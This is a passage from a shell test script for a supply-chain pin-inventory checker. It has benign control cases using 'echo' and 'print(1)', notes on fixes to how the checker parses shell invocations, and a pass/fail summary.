PY
CASE="D1 control: a variable that holds an ordinary command (echo) is no finding on the line that uses it"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
for use in ('$X hello', '"$X" hello'):
    text = "#!/bin/sh\nX=echo\n" + use + "\n"
    assert not [f for _k, f, _b in inv.unmeasured_occurrences({"bin/x.sh": text}) if f == use], use
PY

dyn=0
newcase dynlit "$(printf 'import pathlib\npathlib.Path("bin/lit.sh").write_text("echo hi\\n")\npathlib.Path("tools").mkdir()\npathlib.Path("tools/lit.py").write_text("print(1)\\n")\npathlib.Path("bin/dynlit.sh").write_text("#!/bin/sh\\nbash bin/lit.sh\\npython3 tools/lit.py\\n")')"
runck dynlit

hd=0

# --- round 8 fix list (and the D1 rule: a shell or interpreter given a script that is no literal bound repo file fails closed) ---------------
# R8-1: no heredoc body is skipped as data; R8-2: continuations folded, an empty word ends no search; R8-3: a source inside $( ) or backticks;
# R8-4: the basename of a command word; R8-5: any option or wrapper before a shell hides nothing; R8-6: holder closure and parameter expansions;
echo "pin-age-check: $pass passed, $failn failed"
test "$failn" -eq 0
